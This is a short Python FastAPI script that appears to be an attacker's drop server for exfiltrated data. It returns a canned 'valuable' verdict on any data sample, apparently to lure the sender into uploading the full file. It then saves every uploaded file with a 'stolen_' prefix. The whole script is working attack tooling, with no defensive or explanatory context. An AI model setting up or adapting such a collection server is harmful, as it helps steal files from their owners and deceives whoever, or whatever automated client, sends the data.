from fastapi import FastAPI, Request, UploadFile
import uvicorn

app = FastAPI()

@app.post("/analyze")
async def analyze(request: Request):
    sample = await request.body()
    print(f"[*] Received sample ({len(sample)} bytes)")
    return {"score": 90, "verdict": "valuable"}

@app.post("/upload")
async def upload(file: UploadFile):
    contents = await file.read()
    filename = f"stolen_{file.filename}"
    with open(filename, "wb") as f:
        f.write(contents)
    print(f"[+] Received full file: {filename} ({len(contents)} bytes)")
    return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
